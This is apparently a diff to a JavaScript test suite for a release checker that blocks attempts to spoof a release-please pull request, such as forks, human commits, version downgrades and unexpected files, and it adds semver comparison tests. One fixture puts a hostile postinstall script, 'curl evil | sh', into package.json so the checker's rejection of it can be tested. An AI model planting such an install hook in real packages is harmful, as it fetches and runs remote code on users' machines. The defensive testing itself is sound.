@@ -3,7 +3,7 @@ import { execFileSync } from 'node:child_process';
 import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join, dirname } from 'node:path';
-import { checkCoverage, checkEdits } from '../check-versions.mjs';
+import { checkCoverage, checkEdits, compareSemver } from '../check-versions.mjs';
 
 const CONFIG = 'release-please-config.json';
 const MANIFEST = '.release-please-manifest.json';
@@ -15,9 +15,20 @@ const put = (path, content) => {
   writeFileSync(join(dir, path), typeof content === 'string' ? content : JSON.stringify(content, null, 2) + '\n');
 };
 const pkg = (name, version) => ({ name, version, private: true });
-const commit = (msg) => {
+const BOT = { name: 'github-actions[bot]', email: '41898282+github-actions[bot]@users.noreply.github.com' };
+const HUMAN = { name: 't', email: 't@example.com' };
+const commit = (msg, who = HUMAN, committer = who) => {
   git('add', '-A');
-  git('-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-q', '-m', msg, '--no-gpg-sign');
+  execFileSync('git', ['commit', '-q', '-m', msg, '--no-gpg-sign'], {
+    cwd: dir,
+    env: {
+      ...process.env,
+      GIT_AUTHOR_NAME: who.name,
+      GIT_AUTHOR_EMAIL: who.email,
+      GIT_COMMITTER_NAME: committer.name,
+      GIT_COMMITTER_EMAIL: committer.email,
+    },
+  });
   return git('rev-parse', 'HEAD');
 };
 const config = (packages) => ({
@@ -116,31 +127,96 @@ describe('checkEdits', () => {
     expect(run(base, commit('chore: manifest'))[0]).toMatch(/Only release-please's release PR/);
   });
 
-  it('allows release-please\'s own branch when package.json and manifest agree', () => {
+  const release = (extra = {}) => ({
+    headRef: 'release-please--branches--main--components--a',
+    headRepo: 'o/r',
+    baseRepo: 'o/r',
+    prAuthor: 'github-actions[bot]',
+    ...extra,
+  });
+  const bump = (version = '0.3.0') => {
+    put('packages/a/package.json', pkg('a', version));
+    put(MANIFEST, { '.': '1.0.0', 'packages/a': version });
+  };
+
+  it("allows release-please's own pull request: bot author, bot commits, only version, manifest and changelog files", () => {
     const base = baseRepo();
-    put('packages/a/package.json', pkg('a', '0.3.0'));
-    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.3.0' });
-    const head = commit('chore(main): release a 0.3.0');
-    const ctx = { headRef: 'release-please--branches--main--components--a', headRepo: 'o/r', baseRepo: 'o/r' };
-    expect(run(base, head, ctx)).toEqual([]);
+    bump();
+    put('packages/a/CHANGELOG.md', '# Changelog\n\n## 0.3.0\n');
+    const head = commit('chore(main): release a 0.3.0', BOT, { name: 'GitHub', email: 'noreply@github.com' });
+    expect(run(base, head, release())).toEqual([]);
   });
 
-  it('does not trust a release-please branch name from a fork', () => {
-    const base = baseRepo();
-    put('packages/a/package.json', pkg('a', '0.3.0'));
-    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.3.0' });
-    const head = commit('chore: sneaky');
-    const ctx = { headRef: 'release-please--branches--main', headRepo: 'fork/r', baseRepo: 'o/r' };
-    expect(run(base, head, ctx).length).toBeGreaterThan(0);
-  });
+  describe('spoofing the release exemption', () => {
+    it('refuses a human who only names the branch like release-please', () => {
+      const base = baseRepo();
+      bump('9.9.9');
+      const head = commit('chore: sneaky');
+      const problems = run(base, head, release({ prAuthor: 'mallory' }));
+      const text = problems.join('\n');
+      expect(text).toMatch(/named like a release-please branch but this is not release-please's pull request/);
+      expect(text).toMatch(/opened by "mallory"/);
+      expect(text).toMatch(/authored by t@example\.com/);
+      expect(text).toMatch(/packages\/a\/package\.json: version changed 0\.2\.0 -> 9\.9\.9/);
+    });
 
-  it('refuses a release-please branch whose package.json disagrees with the manifest', () => {
-    const base = baseRepo();
-    put('packages/a/package.json', pkg('a', '5.0.0'));
-    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.3.0' });
-    const head = commit('chore: mismatch');
-    const ctx = { headRef: 'release-please--branches--main', headRepo: 'o/r', baseRepo: 'o/r' };
-    expect(run(base, head, ctx).join('\n')).toMatch(/packages\/a\/package\.json: version changed/);
+    it('refuses the bot as author when a human committed onto the branch', () => {
+      const base = baseRepo();
+      bump();
+      commit('chore(main): release a 0.3.0', BOT);
+      put('packages/a/package.json', pkg('a', '9.9.9'));
+      put(MANIFEST, { '.': '1.0.0', 'packages/a': '9.9.9' });
+      const head = commit('fix: edit the release', HUMAN);
+      expect(run(base, head, release()).join('\n')).toMatch(/commit [0-9a-f]{7} is authored by t@example\.com/);
+    });
+
+    it('refuses a bot-authored branch whose pull request was opened by someone else', () => {
+      const base = baseRepo();
+      bump();
+      const head = commit('chore(main): release a 0.3.0', BOT);
+      expect(run(base, head, release({ prAuthor: 'mallory' })).join('\n')).toMatch(/opened by "mallory"/);
+    });
+
+    it('refuses a release PR that touches a file release-please does not write', () => {
+      const base = baseRepo();
+      bump();
+      put('src/evil.mjs', 'process.exit(0)\n');
+      const head = commit('chore(main): release a 0.3.0', BOT);
+      expect(run(base, head, release()).join('\n')).toMatch(/src\/evil\.mjs is not a file release-please writes/);
+    });
+
+    it('refuses a release PR that changes more of package.json than the version', () => {
+      const base = baseRepo();
+      put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.3.0' });
+      put('packages/a/package.json', { ...pkg('a', '0.3.0'), scripts: { postinstall: 'curl evil | sh' } });
+      const head = commit('chore(main): release a 0.3.0', BOT);
+      expect(run(base, head, release()).join('\n')).toMatch(/changes more than "version"/);
+    });
+
+    it('refuses a release PR whose versions go down or stay put', () => {
+      const base = baseRepo();
+      bump('0.1.0');
+      const head = commit('chore(main): release a 0.1.0', BOT);
+      expect(run(base, head, release()).join('\n')).toMatch(/does not go up/);
+    });
+
+    it('refuses a release PR from a fork even when everything else matches', () => {
+      const base = baseRepo();
+      bump();
+      const head = commit('chore(main): release a 0.3.0', BOT);
+      expect(run(base, head, release({ headRepo: 'fork/r' })).join('\n')).toMatch(/a fork/);
+    });
+
+    it('honours a configured actor and extra release files, and nothing else', () => {
+      const base = baseRepo();
+      const app = { name: 'release-app[bot]', email: '7+release-app[bot]@users.noreply.github.com' };
+      bump();
+      put('packages/a/pyproject.toml', 'version = "0.3.0"\n');
+      const head = commit('chore(main): release a 0.3.0', app);
+      const ctx = release({ prAuthor: 'release-app[bot]', actors: ['release-app[bot]'], extraFiles: ['packages/*/pyproject.toml'] });
+      expect(run(base, head, ctx)).toEqual([]);
+      expect(run(base, head, release({ prAuthor: 'release-app[bot]', actors: ['release-app[bot]'] })).join('\n')).toMatch(/pyproject\.toml is not a file release-please writes/);
+    });
   });
 
   it('lets a new package declare its starting version when the manifest agrees', () => {
@@ -169,4 +245,17 @@ describe('checkEdits', () => {
     expect(run(tip, head)).toEqual([]);
     expect(base).not.toBe(tip);
   });
+});
+
+describe('compareSemver', () => {
+  it.each([
+    ['0.3.0', '0.2.0', 1],
+    ['0.2.6-bookcase.2', '0.2.5-bookcase.2', 1],
+    ['0.3.0', '0.3.0-rc.1', 1],
+    ['0.3.0-rc.2', '0.3.0-rc.10', -1],
+    ['1.0.0', '1.0.0', 0],
+  ])('%s vs %s', (a, b, sign) => {
+    expect(Math.sign(compareSemver(a, b))).toBe(sign);
+  });
+  it('is null for a non-version', () => expect(compareSemver('latest', '1.0.0')).toBeNull());
 });
